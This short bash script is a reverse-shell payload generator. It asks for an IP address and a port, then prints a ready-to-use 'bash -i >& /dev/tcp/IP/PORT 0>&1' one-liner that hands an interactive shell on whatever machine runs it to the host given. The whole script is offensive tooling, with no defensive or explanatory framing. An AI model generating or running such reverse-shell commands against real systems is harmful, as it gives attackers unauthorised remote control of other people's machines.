#!/bin/bash
echo -ne "Your IP: "
read ip
echo -ne "Port: "
read port
echo -e "bash -i >& /dev/tcp/$ip/$port 0>&1"
